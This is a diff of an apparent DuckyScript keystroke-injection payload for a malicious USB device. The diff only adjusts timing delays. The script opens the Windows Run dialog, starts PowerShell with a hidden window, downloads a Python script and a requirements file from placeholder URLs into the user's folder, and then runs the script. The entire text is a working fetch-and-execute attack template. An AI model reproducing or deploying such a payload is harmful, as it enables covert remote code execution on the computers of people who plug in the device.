@@ -5,14 +5,14 @@ GUI r
 DELAY 1000
 STRING powershell -w h Invoke-WebRequest -Uri #SCRIPTURL2 -OutFile C:/Users/$env:UserName\requirements.txt
 ENTER
-DELAY 5000
+DELAY 3000
 STRING exit
 
 GUI r
 DELAY 1000
 STRING powershell -w h Invoke-WebRequest -Uri #SCRIPTURL1 -OutFile C:/Users/$env:UserName\script.py
 ENTER
-DELAY 5000
+DELAY 3000
 STRING exit
 
 GUI r
@@ -23,4 +23,3 @@ ENTER
 DELAY 1000
 STRING python C:/Users/$env:UserName\script.py
 ENTER
-DELAY 1000
